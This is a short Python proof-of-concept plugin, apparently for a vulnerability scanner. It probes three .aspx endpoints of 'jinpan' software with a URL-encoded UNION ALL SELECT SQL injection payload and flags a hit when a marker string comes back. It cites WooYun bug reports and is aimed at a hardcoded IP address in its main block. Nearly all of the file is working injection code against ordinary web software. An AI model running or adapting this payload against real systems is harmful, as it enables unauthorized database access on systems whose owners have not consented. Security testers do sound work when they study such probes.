#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-055323
#refer:http://www.wooyun.org/bugs/wooyun-2010-083240

import re

def assign(service, arg):
    if service == "jinpan":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'HotCollection.aspx?Call=Z',
        'HotGrade.aspx?Call=Z',
        'HotBroow.aspx?Call=TH'
        ]
    getdata = '%27%20union%20all%20select%20null%2Cnull%2Cnull%2CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2888%29%7C%7CCHR%28112%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2885%29%7C%7CCHR%2889%29%7C%7CCHR%2869%29%7C%7CCHR%28116%29%7C%7CCHR%28110%29%7C%7CCHR%28103%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%2Cnull%2Cnull%2Cnull%20FROM%20DUAL--'
    for payload in payloads:
        url = arg + payload +getdata      
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200  and 'qpvjqXpTXUYEtngqkjkq' in res :
            security_hole(arg+payload+'   :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('jinpan', 'http://222.77.99.242:8088/')[1])